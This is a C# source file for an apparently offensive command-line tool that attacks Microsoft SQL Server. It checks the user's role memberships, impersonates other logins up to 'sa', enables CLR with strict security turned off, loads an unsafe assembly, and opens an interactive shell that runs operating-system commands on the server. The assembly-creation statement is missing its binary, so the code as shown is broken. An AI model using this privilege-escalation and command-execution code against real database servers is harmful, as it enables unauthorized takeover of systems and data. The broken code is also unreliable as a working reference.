using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SqlSpShell
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication successful");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failure");
                Environment.Exit(0);
            }

            Console.WriteLine("[!] Checking user privileges");
            String user = "select system_user;";
            SqlCommand cmd = new SqlCommand(user, conn);
            SqlDataReader read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Mapped to user: {read[0]}");
            read.Close();

            String pub = "select is_srvrolemember('public');";
            cmd = new SqlCommand(pub, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Int32 role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            read.Close();

            String adm = "select is_srvrolemember('sysadmin');";
            cmd = new SqlCommand(adm, conn);
            read = cmd.ExecuteReader();
            read.Read();
            role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a sysadmin");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a sysadmin");
            }
            read.Close();

            Console.WriteLine("[!] Checking for user impersonation");
            String query = "select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate';";
            cmd = new SqlCommand(query, conn);
            read = cmd.ExecuteReader();

            while (read.Read() == true)
            {
                Console.WriteLine($"[+] {read[0]} can be impersonated");
            }
            read.Close();

            Console.Write("[*] Would you like to attempt impersonation? [y/n]: ");
            String answer = Console.ReadLine();

            if (answer.ToLower() == "y")
            {
                try
                {
                    Console.Write("[*] Enter user to impersonate: ");
                    String target = Console.ReadLine();
                    Console.WriteLine($"[!] Attempting to impersonate {target}");
                    String runas = $"use msdb; execute as user = '{target}';";
                    cmd = new SqlCommand(runas, conn);
                    read = cmd.ExecuteReader();
                    read.Close();
                    Console.WriteLine("[+] Impersonation success!");
                    String check = "select system_user;";
                    cmd = new SqlCommand(check, conn);
                    read = cmd.ExecuteReader();
                    read.Read();
                    Console.WriteLine($"[+] Current user: {read[0]}");
                    read.Close();

                    Console.Write("[*] Would you like to attempt to enable stored procedure? [y/n]: ");
                    answer = Console.ReadLine();

                    if (answer.ToLower() == "y")
                    {
                        String cwd = Directory.GetCurrentDirectory();
                        Console.WriteLine("[!] Attempting to enable stored procedure");

                        String impersonate = "execute as login = 'sa';";
                        cmd = new SqlCommand(impersonate, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        String enableOpts = "use msdb; exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'clr enabled', 1; reconfigure; exec sp_configure 'clr strict security', 0; reconfigure;";
                        cmd = new SqlCommand(enableOpts, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        String createAssem = "create assembly myAssembly from with permission_set = unsafe;";
                        cmd = new SqlCommand(createAssem, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        Console.WriteLine("[+] Entering new shell session");
                        Console.Write($"\nMSSQL {cwd}> ");
                        String command = Console.ReadLine();
                        String execCmd = $"exec cmdExec '{command}';";
                        String createProc = "create procedure [dbo].[cmdExec] @execCmd nvarchar (4000) as external name [myAssembly].[StoredProcedures].[cmdExec]";
                        
                        cmd = new SqlCommand(createProc, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        cmd = new SqlCommand(execCmd, conn);
                        read = cmd.ExecuteReader();
                        read.Read();
                        Console.WriteLine($"{read[0]}");
                        read.Close();

                        while (true)
                        {
                            Console.Write($"MSSQL {cwd}> ");
                            command = Console.ReadLine();
                            execCmd = $"exec cmdExec '{command}';";
                            cmd = new SqlCommand(execCmd, conn);
                            read = cmd.ExecuteReader();
                            read.Read();
                            Console.WriteLine($"{read[0]}");
                            read.Close();

                            if (String.Equals(command, "exit"))
                            {
                                impersonate = "use msdb; execute as user = 'dbo';";
                                cmd = new SqlCommand(impersonate, conn);
                                read = cmd.ExecuteReader();
                                read.Close();

                                String dropProc = "drop procedure cmdExec;";
                                cmd = new SqlCommand(dropProc, conn);
                                read = cmd.ExecuteReader();
                                read.Close();

                                String dropAssem = "drop assembly myAssembly;";
                                cmd = new SqlCommand(dropAssem, conn);
                                read = cmd.ExecuteReader();
                                read.Close();

                                conn.Close();

                                Console.Clear();
                                break;
                            }
                        }
                        conn.Close();
                    }
                    else if (answer.ToLower() == "n")
                    {
                        conn.Close();
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("[-] Invalid selection!");
                        conn.Close();
                        Environment.Exit(0);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            else if (answer.ToLower() == "n")
            {
                conn.Close();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] Invalid selection!");
                conn.Close();
                Environment.Exit(0);
            }
            conn.Close();
        }
    }
}